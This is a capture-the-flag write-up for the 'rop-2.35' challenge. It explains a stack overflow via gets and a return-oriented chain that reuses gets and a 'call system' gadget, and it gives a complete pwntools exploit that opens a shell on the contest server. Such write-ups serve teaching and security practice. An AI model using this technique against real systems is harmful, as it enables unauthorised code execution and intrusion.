# rop-2.35

## Overview

We are given a small Linux binary with no PIE or stack canaries. The
binary calls `system` then calls `gets` on a stack buffer:

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

## Exploit

The crux of the challenge is to control the first argument to a call to
`system`.

When `main()` returns, `rax` contains address of the buffer. There is a
tempting `mov rdi, rax; call system` gadget, but that doesn't work
because when `system` pushes registers onto the stack, that overwrites
whatever command we just read into the buffer.

Running the challenge in gdb, we find that when `main` returns,
`rdi` contains a writeable address inside of libc. We return to `gets`
to write a command into it, then return to the
`mov rdi, rax; call system` gadget we identified. The exploit includes
an extra `ret` gadgets to maintain proper stack alignment.

The exploit prepends a number of slashes to the beginning of the command
beause we observed that something in libc would write 0x2e (.) near the
libc address that we write the command to. Luckily, no null bytes are
written, so our command is preserved.

Exploit:
```python
#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

r = remote('rop-2-35.seccon.games', 9999)

gets = 0x401060
ret = 0x401110
mov_rdi_rax_call_system = 0x401169

payload = b'A' * 0x18
payload += p64(gets)
payload += p64(ret)
payload += p64(mov_rdi_rax_call_system)
r.sendline(payload)

r.sendline('////////////////////bin/sh')

r.interactive(prompt='')
```

The flag for this challenge references some sort of CSU trick, but we
didn't do anything like that :-)
